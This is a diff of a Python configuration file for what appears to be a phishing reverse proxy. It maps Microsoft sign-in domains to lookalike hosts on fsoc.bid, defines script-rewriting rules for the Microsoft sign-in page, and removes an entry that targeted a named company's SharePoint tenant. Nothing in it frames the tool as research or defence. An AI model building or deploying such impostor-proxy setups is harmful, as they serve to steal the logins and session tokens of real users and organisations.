@@ -15,10 +15,20 @@ class Target(TypedDict):
     port: int
 
 
+class Modification(TypedDict):
+    """
+    Modification Class
+    """
+
+    mimes: list[str]
+    sites: list[str]
+    search: str
+    replace: str
+
+
 TARGETS: list[Target] = [
     {"origin": "mysignins.microsoft.com", "proxy": "mysignins.fsoc.bid", "port": 6000},
     {"origin": "login.microsoftonline.com", "proxy": "login.fsoc.bid", "port": 6001},
-    {"origin": "bystroniclaser.sharepoint.com", "proxy": "bystroniclaser.fsoc.bid", "port": 6002}
 ]
 
 CONTENT_TYPES: list[str] = [
@@ -36,7 +46,7 @@ LOCAL_UPSTREAM_SCHEME: Literal[
 ] = "http"
 LOCAL_UPSTREAM_HOSTNAME = "local.fsoc.bid"
 
-CUSTOM_MODIFICATIONS: list[dict[str, str | list[str]]] = [
+CUSTOM_MODIFICATIONS: list[Modification] = [
     {
         "mimes": ["application/javascript", "application/x-javascript"],
         "sites": ["mysignins.microsoft.com"],
